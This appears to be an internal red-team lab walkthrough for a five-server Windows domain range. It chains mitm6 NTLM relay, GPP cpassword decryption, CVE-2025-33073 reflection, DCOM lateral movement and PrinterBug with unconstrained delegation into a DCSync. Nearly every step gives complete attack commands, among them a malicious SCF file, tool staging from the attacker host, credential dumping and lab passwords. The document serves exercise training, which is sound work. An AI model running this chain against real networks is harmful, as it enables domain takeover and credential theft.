# APT36 — Operation PHANTOM RELAY
## Red Team Exercise Write-Up — Range 5: Phantom Relay

> **Classification:** RESTRICTED — Internal Red Team Use Only

| Field | Detail |
|---|---|
| **Environment** | 5 × Windows Server 2019 |
| **Domain** | corp.prabalurja.in / CORPPUL |
| **Actor** | APT36 (Transparent Tribe / Mythic Leopard / APT-C-56) |
| **Entry Point** | `svc-monitor:M0n!tor@PUL24` (carried from Range 4) |
| **Attack Chain** | mitm6 NTLM Relay → GPP cpassword → CVE-2025-33073 → DCOM → Unconstrained Delegation + PrinterBug → DCSync |
| **End Goal** | Full Domain Compromise — DCSync of corp.prabalurja.in |

---

## 1. Executive Summary

The chain runs across five hosts: the Domain Controller, a web portal, a NAS file server, a CI/build server, and a bastion host. Players arrive with the low-privileged `svc-monitor` credential. From there the operator poisons IPv6 DNS with mitm6 and relays a coerced machine-account authentication to LDAP, decrypts a GPP cpassword to recover a second service account, exploits CVE-2025-33073 NTLM reflection to gain SYSTEM on the CI server, moves laterally over DCOM to the bastion, and finally abuses unconstrained delegation with the printer bug to capture the Domain Controller's TGT and DCSync the domain. SMB signing is enforced only on the DC, which is what makes the relay and reflection primitives viable against every member server.

### Attack Chain at a Glance

| Step | Source | Target | Technique | ATT&CK |
|---|---|---|---|---|
| 0 | svc-monitor (carried) | Domain | Enumeration, relay-target + IPv6 check | T1087 / T1046 |
| 1 | svc-monitor | DC-CORPUL | mitm6 IPv6 DNS takeover → NTLM relay to LDAP → reset `svc_file` | T1557.001 / T1098 |
| 2 | svc_file | SRV-NAS | GPP `cpassword` from SYSVOLBackup → `svc_build` | T1552.006 |
| 3 | svc_build | SRV-CI | CVE-2025-33073 NTLM reflection → SYSTEM → `svc_admin` hash | T1557 / T1068 |
| 4 | svc_admin | SRV-BASTION | DCOM (`MMC20.Application`) lateral movement | T1021.003 |
| 5 | SRV-BASTION (uncon. deleg) | DC-CORPUL | PrinterBug → DC-CORPUL$ TGT → DCSync | T1187 / T1003.006 |

---

## 2. Lab Environment

### 2.1 Host Inventory

| Hostname | OS | Role | Key Vulnerability |
|---|---|---|---|
| DC-CORPUL.corp.prabalurja.in | Windows Server 2019 | Domain Controller + DNS | SMB signing enforced (not relayable); Print Spooler running — PrinterBug coercion target |
| SRV-PORTAL.corp.prabalurja.in | Windows Server 2019 | Web Portal | SMB signing disabled; WebHealthCheck WPAD task (mitm6 trigger); `SRV-PORTAL$` has GenericAll on `svc_file` |
| SRV-NAS.corp.prabalurja.in | Windows Server 2019 | File Server | SMB signing disabled; SYSVOLBackup share contains a GPP `cpassword` in Groups.xml |
| SRV-CI.corp.prabalurja.in | Windows Server 2019 | CI / Build Server | SMB signing disabled; vulnerable to CVE-2025-33073 → SYSTEM; `svc_admin` and `svc_dadmin` cached in LSASS |
| SRV-BASTION.corp.prabalurja.in | Windows Server 2019 | Bastion / Jump | Unconstrained Delegation; `svc_admin` is local admin; Print Spooler running |

### 2.2 Domain Accounts

| Account | Type | Group Membership | Purpose |
|---|---|---|---|
| svc-monitor | Service account | Domain Users | ENTRY POINT, carried from Range 4 (`M0n!tor@PUL24`) |
| svc_file | Service account | Domain Users | File service account — reset via relay/ACL (`F1l3$3rv!c3#2025`) |
| svc_build | Service account | Domain Users | Recovered from GPP cpassword (`Bu1ld$3rv!c3#2025`) |
| svc_admin | Service account | Local Admin on SRV-BASTION | From SRV-CI LSASS (`Adm1n$3rv!c3#2025`) |
| svc_dadmin | Service account | Domain Admins | Bonus DA from SRV-CI LSASS (`D@dm1n$3rv!c3#2025`) |

### 2.3 Key Misconfigurations

Six deliberate conditions chain together from a low-privileged foothold to full domain compromise:

**SMB signing disabled on all member servers** — Only the DC enforces signing. Every member server therefore appears in the relay target list, enabling both the Step 1 NTLM relay and the Step 3 reflection.

**IPv6 enabled with no DHCPv6 / RA filtering** — Windows listens on IPv6 by default. mitm6 can answer DHCPv6 and poison DNS, redirecting the SRV-PORTAL WPAD lookup to the attacker and coercing a relayable machine-account authentication.

**SRV-PORTAL$ GenericAll on svc_file** — A pre-staged ACL lets the relayed SRV-PORTAL$ session (or the operator) reset the `svc_file` password.

**GPP cpassword in SYSVOLBackup** — A `Groups.xml` in the backup share carries a `cpassword` encrypted with the public, published AES key, effectively exposing `svc_build` in cleartext.

**CVE-2025-33073 unpatched on SRV-CI** — With the June 2025 update missing and SMB signing off, a coerced authentication can be reflected back to SRV-CI's own SMB for SYSTEM. (Confirmed: Microsoft patched this on 10 June 2025; enforced SMB signing also blocks it.)

**Unconstrained delegation on SRV-BASTION** — Any authentication to SRV-BASTION leaves the source's TGT in memory. Coercing the DC (PrinterBug) deposits the DC-CORPUL$ TGT, which is replayed for DCSync.

### 2.4 Boot Order

Boot **DC-CORPUL** first and wait 90 seconds for AD DS and DNS to initialise. Bring up **SRV-PORTAL** next so its WebHealthCheck WPAD task is running before Step 1. **SRV-NAS, SRV-CI, and SRV-BASTION** can then start in any order. SRV-CI must remain unpatched for Step 3, and SRV-BASTION must retain its unconstrained-delegation flag for Step 5. The lab is fully operational approximately 3–5 minutes after all five VMs are running.

---

## 3. Environment Setup

All commands are run from a **Kali Linux** attacker machine with network access to the lab subnet. Set the session variables first:

```bash
export KALI_IP=<your_kali_ip>
export dc_corpul=<dc-corpul_ip>
export srv_portal=<srv-portal_ip>
export srv_nas=<srv-nas_ip>
export srv_ci=<srv-ci_ip>
export srv_bastion=<srv-bastion_ip>
```

### 3.1 Required Tools

| Tool | Purpose |
|---|---|
| nxc (NetExec) | SMB/LDAP enumeration, relay-target list, signing check, command execution |
| impacket (ntlmrelayx, smbserver, secretsdump, dcomexec, ticketConverter) | Relay, credential dumping, DCOM execution, ticket conversion |
| mitm6 | IPv6 DHCPv6/DNS takeover |
| bloodyAD | ACL enumeration |
| smbclient, gpp-decrypt | SYSVOLBackup access and cpassword decryption |
| dnstool.py (krbrelayx) | Crafted DNS record for CVE-2025-33073 |
| PetitPotam.py / printerbug.py (krbrelayx) | Authentication coercion |
| Rubeus.exe, SpoolSample.exe | TGT capture on the unconstrained-delegation host |
| mimikatz | DCSync / ticket use (Windows path) |
| proxychains, responder, hashcat | SOCKS pivot, fallback poisoning, hash cracking |

---

## Step 0 — Entry Point: svc-monitor Enumeration

**Target:** Domain &nbsp;|&nbsp; **MITRE:** T1087 — Account Discovery / T1046 — Network Service Discovery

### What This Step Does

Confirms the carried `svc-monitor` credential, enumerates the domain, and establishes the two preconditions for Step 1: which servers lack SMB signing, and whether IPv6 is live.

```bash
# Verify the credential (authenticated, not admin)
nxc smb $dc_corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in

# LDAP enumeration
nxc ldap $dc_corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --users
nxc ldap $dc_corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --groups
nxc ldap $dc_corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --computers

# SMB shares
nxc smb $srv_portal $srv_nas $srv_ci $srv_bastion $dc_corpul -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --shares

# Relay targets (SMB signing disabled) — DC will NOT appear
nxc smb $srv_portal $srv_nas $srv_ci $srv_bastion -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in --gen-relay-list /tmp/relay_targets.txt
cat /tmp/relay_targets.txt

# IPv6 presence (mitm6 prerequisite)
nxc smb $srv_portal -u svc-monitor -p 'M0n!tor@PUL24' -d corp.prabalurja.in -x "ipconfig"
```

> **Step 0 Result:** `svc-monitor` confirmed. All four member servers listed as relay targets (DC excluded). IPv6 confirmed live.

---

## Step 1 — mitm6 IPv6 Takeover → NTLM Relay to LDAP

**Target:** `DC-CORPUL` (LDAP) &nbsp;|&nbsp; **MITRE:** T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay / T1098 — Account Manipulation

### What This Step Does

Poisons IPv6 DNS so SRV-PORTAL's WPAD lookup resolves to Kali, coerces SRV-PORTAL$ to authenticate, relays that authentication to DC LDAP, and resets the `svc_file` password using the pre-staged SRV-PORTAL$ GenericAll.

### Why It Works

Windows prefers IPv6 and queries DHCPv6 by default. mitm6 answers as the IPv6 DNS server; the SRV-PORTAL WebHealthCheck WPAD request is redirected to Kali, triggering NTLM authentication by SRV-PORTAL$. Because the DC's LDAP is reachable and SRV-PORTAL$ holds GenericAll over `svc_file`, the relayed session can reset that account.

### Phase 1a — Start ntlmrelayx

```bash
# Terminal 1
impacket-ntlmrelayx -t ldaps://$dc_corpul --no-smb-server --no-wcf-server --no-raw-server -6 -i
# or, to escalate a specific user via ACL:
ntlmrelayx.py -t ldap://$dc_corpul -wh attacker-wpad --escalate-user svc-monitor
```

### Phase 1b — Start mitm6

```bash
# Terminal 2
sudo mitm6 -d corp.prabalurja.in -i eth0 --ignore-nofqdn -hb DC-CORPUL -hb DC-CORPUL.corp.prabalurja.in
```

### Phase 1c — Wait for the WPAD Trigger

The WebHealthCheck task on SRV-PORTAL makes HTTP requests every 2 minutes. Once IPv6 DNS is poisoned, the WPAD lookup hits Kali and the relayed authentication appears in Terminal 1:

```
[*] HTTPD: Received connection from SRV-PORTAL$
[*] HTTPD: Client SRV-PORTAL$ has been relayed to ldap://dc-corpul
[*] Attempting to create computer account...
```

If using interactive LDAP, connect to the relay shell and reset the target:

```bash
nc 127.0.0.1 11000
change_password svc_file N3wF1l3P@ss!2025
```

### Phase 1d — Confirm the ACL and Reset svc_file

```bash
# SRV-PORTAL$ has GenericAll on svc_file
bloodyAD -d corp.prabalurja.in -u svc-monitor -p 'M0n!tor@PUL24' --host $dc_corpul get writable --detail 2>/dev/null | grep svc_file

# Reset via the relay session or the ACL
net rpc password svc_file 'N3wF1l3P@ss!2025' -U 'CORPPUL/svc-monitor%M0n!tor@PUL24' -S $dc_corpul
```

### Phase 1e — Verify svc_file

```bash
nxc smb $srv_nas -u svc_file -p 'F1l3$3rv!c3#2025' -d corp.prabalurja.in --shares   # SYSVOLBackup + Data
```

### Contingency C1a — LLMNR / NBT-NS Poisoning

```bash
sudo responder -I eth0 -wv   # LegacyBackupCheck task uses svc_file every 5 min
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
```

### Contingency C1b — SCF on Writable DropBox Share

```bash
smbclient //$srv_portal/DropBox -N -c "ls"
cat > /tmp/evil.scf << 'EOF'
[Shell]
Command=2
IconFile=\\KALI_IP\share\icon.ico
[Taskbar]
Command=ToggleDesktop
EOF
smbclient //$srv_portal/DropBox -N -c "put /tmp/evil.scf @evil.scf"
sudo responder -I eth0 -wv
```

### Contingency C1c — web.config.bak

```bash
curl -s http://$srv_portal/web.config.bak   # svc_file password F1l3$3rv!c3#2025
```

> **Step 1 Result:** `svc_file` (`F1l3$3rv!c3#2025`) obtained via relayed reset. Access to SYSVOLBackup and Data shares on SRV-NAS confirmed.

---

## Step 2 — GPP cpassword from SYSVOL Backup Share

**Target:** `SRV-NAS` &nbsp;|&nbsp; **MITRE:** T1552.006 — Group Policy Preferences

### What This Step Does

Reads `Groups.xml` from the SYSVOLBackup share and decrypts the `cpassword` to recover `svc_build`.

### Why It Works

Group Policy Preferences store passwords as `cpassword`, AES-encrypted with a key Microsoft published in 2012. Any `cpassword` is therefore trivially reversible with `gpp-decrypt`.

### Phase 2a — Retrieve Groups.xml

```bash
smbclient //$srv_nas/SYSVOLBackup -U 'CORPPUL/svc_file%F1l3$3rv!c3#2025' -c "ls"
smbclient //$srv_nas/SYSVOLBackup -U 'CORPPUL/svc_file%F1l3$3rv!c3#2025' -c "cd Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups; get Groups.xml"
cat Groups.xml   # note the cpassword attribute
```

### Phase 2b — Decrypt and Verify

```bash
gpp-decrypt "CPASSWORD_VALUE_HERE"   # Bu1ld$3rv!c3#2025
nxc smb $dc_corpul -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in   # [+]
```

### Contingency C2b — IT-Scripts Share

```bash
smbclient //$srv_nas/IT-Scripts -U 'CORPPUL/svc_file%F1l3$3rv!c3#2025' -c "get deploy.ps1"
cat deploy.ps1 | grep -i password   # Bu1ld$3rv!c3#2025 in comments
```

> **Step 2 Result:** `svc_build` (`Bu1ld$3rv!c3#2025`) recovered and validated against the DC.

---

## Step 3 — CVE-2025-33073: NTLM Reflection → SYSTEM on SRV-CI

**Target:** `SRV-CI` &nbsp;|&nbsp; **MITRE:** T1557 — Adversary-in-the-Middle / T1068 — Exploitation for Privilege Escalation

### What This Step Does

Adds a crafted DNS record, coerces SRV-CI to authenticate to it, reflects that authentication back to SRV-CI's own SMB for SYSTEM, and dumps `svc_admin` (plus the bonus DA `svc_dadmin`).

### Why It Works

CVE-2025-33073 abuses how Windows handles a marshalled target name in a DNS record: the SMB client strips the metadata, concludes the connection is local, and engages local NTLM mode without challenge-response validation. With SMB signing off and the host unpatched, the coerced authentication is reflected to SRV-CI itself, granting NT AUTHORITY\SYSTEM.

### Phase 3a — Start ntlmrelayx Against SRV-CI's Own SMB

```bash
# Terminal 1
ntlmrelayx.py -t smb://$srv_ci -smb2support -socks
# or interactive:
ntlmrelayx.py -t smb://$srv_ci -smb2support -i
```

### Phase 3b — Add the Crafted DNS Record via LDAP

```bash
# Terminal 2
python3 dnstool.py -u 'corp.prabalurja.in\svc_build' -p 'Bu1ld$3rv!c3#2025' \
    -a add \
    -r '1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.corp.prabalurja.in' \
    -d $KALI_IP \
    $dc_corpul
```

### Phase 3c — Coerce SRV-CI to the Crafted Name

```bash
# Terminal 3
python3 PetitPotam.py -u 'svc_build' -p 'Bu1ld$3rv!c3#2025' $KALI_IP $srv_ci
```

### Phase 3d — Confirm Reflection and Dump

Terminal 1 shows the reflected, privileged session:

```
[*] Authenticating against smb://srv-ci as CORPPUL/SRV-CI$ SUCCEED
[*] AdminStatus: TRUE
[*] SOCKS: Adding CORPPUL/SRV-CI$@srv-ci to active SOCKS connections
```
```bash
proxychains secretsdump.py 'CORPPUL/SRV-CI$@'$srv_ci -no-pass
# or interactive (-i): nc 127.0.0.1 11000 → SYSTEM shell
#   reg save HKLM\SAM C:\temp\SAM ; reg save HKLM\SYSTEM C:\temp\SYSTEM
```

The dump yields `svc_admin` (AdminMonitor task), `svc_dadmin` (DomainHealthCheck task — bonus DA), and the local administrator.

### Phase 3e — Validate and Clean Up the DNS Record

```bash
nxc smb $srv_bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in   # (Pwn3d!) — svc_admin is local admin on SRV-BASTION

python3 dnstool.py -u 'corp.prabalurja.in\svc_build' -p 'Bu1ld$3rv!c3#2025' \
    -a remove \
    -r '1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.corp.prabalurja.in' \
    $dc_corpul
```

### Contingency C3a — AlwaysInstallElevated

```bash
nxc smb $srv_ci -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in -x "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated"   # 0x1
```

### Contingency C3b — Unquoted Service Path

```bash
nxc smb $srv_ci -u svc_build -p 'Bu1ld$3rv!c3#2025' -d corp.prabalurja.in -x "wmic service get name,pathname | findstr /v /i C:\Windows | findstr /v \"\""   # CorpBuildTools
```

> **Step 3 Result:** SYSTEM on SRV-CI via CVE-2025-33073. `svc_admin` (`Adm1n$3rv!c3#2025`) and `svc_dadmin` (`D@dm1n$3rv!c3#2025`) recovered. `svc_admin` confirmed local admin on SRV-BASTION.

---

## Step 4 — DCOM Lateral Movement to SRV-BASTION

**Target:** `SRV-BASTION` &nbsp;|&nbsp; **MITRE:** T1021.003 — Distributed Component Object Model

### What This Step Does

Executes commands on SRV-BASTION via the `MMC20.Application` DCOM object as `svc_admin`, and confirms the host is configured for unconstrained delegation.

### Why It Works

`svc_admin` is local admin on SRV-BASTION, and the `MMC20.Application` DCOM object exposes `ExecuteShellCommand`, allowing remote command execution that lands as a child of `mmc.exe`.

### Phase 4a — DCOM Execution

```bash
impacket-dcomexec -object MMC20 'CORPPUL/svc_admin@'$srv_bastion -hashes :NTLM_HASH_HERE
# or with cleartext:
impacket-dcomexec -object MMC20 'CORPPUL/svc_admin:Adm1n$3rv!c3#2025@'$srv_bastion
```
```cmd
whoami    # corppul\svc_admin
hostname  # SRV-BASTION
```

### Phase 4b — Confirm Unconstrained Delegation and Spooler

```cmd
powershell -c "Get-ADComputer SRV-BASTION -Properties TrustedForDelegation | Select-Object TrustedForDelegation"   # True
sc query Spooler                                                                                                     # RUNNING
powershell -c "Test-NetConnection dc-corpul -Port 445"                                                               # DC reachable
```

### Contingency C4a — PSReadline History

```bash
nxc smb $srv_bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in -x "type C:\Users\svc_admin\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"   # D@dm1n$3rv!c3#2025
```

### Contingency C4c — Writable Scheduled Task

```bash
nxc smb $srv_bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in -x "schtasks /query /tn HealthMonitor /fo LIST /v"   # runs as CORPPUL\svc_dadmin
nxc smb $srv_bastion -u svc_admin -H 'NTLM_HASH_HERE' -d corp.prabalurja.in -x "icacls C:\HealthMonitor"                          # Authenticated Users (M)
```

> **Step 4 Result:** Command execution on SRV-BASTION as `corppul\svc_admin`. Unconstrained delegation and a running Print Spooler confirmed.

---

## Step 5 — Unconstrained Delegation + PrinterBug → DC TGT → DCSync

**Target:** `DC-CORPUL` &nbsp;|&nbsp; **MITRE:** T1187 — Forced Authentication / T1003.006 — DCSync

### What This Step Does

Coerces the DC to authenticate to SRV-BASTION via the printer bug, captures the DC-CORPUL$ TGT from memory (unconstrained delegation), and replays it for DCSync.

### Why It Works

SRV-BASTION is trusted for unconstrained delegation, so any authentication to it deposits the source account's TGT in LSASS. Coercing the DC's Print Spooler makes DC-CORPUL$ authenticate to SRV-BASTION, leaving the DC's TGT for capture. A DC machine-account TGT is sufficient for DCSync.

### Phase 5a — Stage Rubeus and Start the TGT Monitor

```bash
# Kali
impacket-smbserver share /opt/redteam/tools -smb2support -username att -password att
```
```cmd
# DCOM shell on SRV-BASTION
net use \\KALI_IP\share /user:att att
copy \\KALI_IP\share\Rubeus.exe C:\temp\Rubeus.exe
C:\temp\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC-CORPUL$
```

### Phase 5b — Trigger the PrinterBug

```bash
# Kali
python3 printerbug.py 'corp.prabalurja.in/svc_admin:Adm1n$3rv!c3#2025'@$dc_corpul $srv_bastion
# or with hash:
python3 printerbug.py 'corp.prabalurja.in/svc_admin'@$dc_corpul $srv_bastion -hashes :NTLM_HASH_HERE
```
```cmd
# or from the SRV-BASTION shell with SpoolSample
C:\temp\SpoolSample.exe DC-CORPUL.corp.prabalurja.in SRV-BASTION.corp.prabalurja.in
```

Rubeus captures the ticket:

```
[*] Captured TGT data for DC-CORPUL$:
    User : DC-CORPUL$@CORP.PRABALURJA.IN
    Base64EncodedTicket : doIF...
```

### Phase 5c — Use the Captured TGT for DCSync

```cmd
# Option A — Windows (Rubeus on SRV-BASTION)
C:\temp\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
mimikatz.exe "lsadump::dcsync /domain:corp.prabalurja.in /user:Administrator" "exit"
```
```bash
# Option B — Kali (impacket)
echo "BASE64_TICKET" | base64 -d > dc_tgt.kirbi
impacket-ticketConverter dc_tgt.kirbi dc_tgt.ccache
export KRB5CCNAME=dc_tgt.ccache
impacket-secretsdump -k -no-pass 'corp.prabalurja.in/DC-CORPUL$@DC-CORPUL.corp.prabalurja.in' -just-dc
```

### Phase 5d — Verify Domain Compromise

```bash
nxc smb $dc_corpul -u Administrator -H 'ADMIN_NTLM_HASH' -d corp.prabalurja.in   # (Pwn3d!)
```

### Contingency C5a — Server Operators

```bash
net rpc group addmem "Server Operators" "svc_admin" -U 'CORPPUL/svc_admin%Adm1n$3rv!c3#2025' -S $dc_corpul
nxc smb $dc_corpul -u svc_admin -p 'Adm1n$3rv!c3#2025' -d corp.prabalurja.in -x "whoami /groups" | grep -i server
```

> **Step 5 Result:** DC-CORPUL$ TGT captured via unconstrained delegation and the printer bug. DCSync of `corp.prabalurja.in` recovers all hashes including `Administrator` and `krbtgt`.

---

## Cleanup

```bash
# Remove the crafted DNS record (if not already done)
python3 dnstool.py -u 'corp.prabalurja.in\svc_build' -p 'Bu1ld$3rv!c3#2025' \
    -a remove -r '1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA.corp.prabalurja.in' $dc_corpul
```
```powershell
# Reset svc_file (if changed in Step 1)
Set-ADAccountPassword -Identity "svc_file" -Reset -NewPassword (ConvertTo-SecureString 'F1l3$3rv!c3#2025' -AsPlainText -Force)
# Remove svc_admin from Server Operators (if added via C5a)
Remove-ADGroupMember -Identity "Server Operators" -Members "svc_admin" -Confirm:$false
```
```cmd
del /f /q C:\temp\Rubeus.exe C:\temp\SpoolSample.exe C:\temp\mimikatz.exe
net use * /delete /y
```

---

## Summary: What Each Step Proves

| Step | Technique Tested | Success Criteria |
|---|---|---|
| 0 | Entry + recon | LDAP enum works, relay targets and SMB signing status known, IPv6 confirmed |
| 1 | mitm6 NTLM relay | SRV-PORTAL$ relayed to DC LDAP; `svc_file` reset (plus C1a/C1b/C1c) |
| 2 | GPP cpassword | Groups.xml found, cpassword decrypted to `svc_build` (plus C2b) |
| 3 | CVE-2025-33073 | NTLM reflected, SYSTEM on SRV-CI, `svc_admin` hash dumped (plus C3a/C3b) |
| 4 | DCOM lateral | Shell on SRV-BASTION via MMC20; unconstrained delegation confirmed (plus C4a/C4c) |
| 5 | Unconstrained + PrinterBug | DC-CORPUL$ TGT captured; DCSync succeeds (plus C5a) |
